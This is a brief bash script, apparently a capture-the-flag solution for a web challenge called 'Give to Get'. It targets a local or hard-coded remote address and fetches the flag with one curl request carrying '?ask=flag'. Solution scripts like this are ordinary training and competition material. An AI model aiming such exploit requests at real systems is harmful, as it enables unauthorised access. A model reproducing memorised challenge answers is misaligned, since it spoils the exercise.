#!/bin/bash
PORT=8084

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# Give to Get
echo "Start exploit for Give to Get"
url=$url'/give-to-get/'
flag=$(curl -s $url'?ask=flag' | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
